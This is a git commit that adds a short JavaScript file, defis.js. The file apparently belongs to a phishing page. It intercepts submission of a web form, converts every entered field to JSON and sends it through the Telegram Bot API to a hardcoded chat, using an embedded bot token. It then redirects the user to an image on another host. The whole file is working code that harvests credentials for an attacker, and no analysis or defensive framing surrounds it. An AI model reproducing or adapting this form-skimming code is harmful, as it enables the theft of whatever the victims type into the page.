3bec540dc271ec0410871be7f2602202277181f1
kup0nn <emiliahalatamu@gmail.com>
2025-05-06 23:03:42 +0700

    Add files via upload

---
+++ defis.js
@@ -0,0 +1,22 @@
+     $(document).ready(function() {
+
+       const chat_id = '7684806406',
+         botID = 'bot7223977892:AAGbyPg6yQ2m-XYZ7kmogxm3lgaMKSyQIRo';
+
+       const telegramURL = `https://api.telegram.org/${botID}/sendMessage`;
+
+       document.querySelector('#defis').addEventListener("submit", async e => { // When the user submits the form
+         e.preventDefault(); // Don't submit
+         let text = JSON.stringify( // Convert the form data to a string to send as our Telegram message
+           Object.fromEntries(new FormData(e.target).entries()), // Convert the form data to an object.
+           null, 2); // Prettify the JSON so we can read the data easily
+         const sendMessage = await fetch(telegramURL, { // Send the request to the telegram API
+           method: 'POST',
+           headers: { "Content-Type": "application/json" }, // This is required when sending a JSON body.
+           body: JSON.stringify({ chat_id, text }), // The body must be a string, not an object
+         });
+         window.location.href = 'https://hosting.tigerengine.id/qqhq80.jpg';
+       });
+
+
+     });
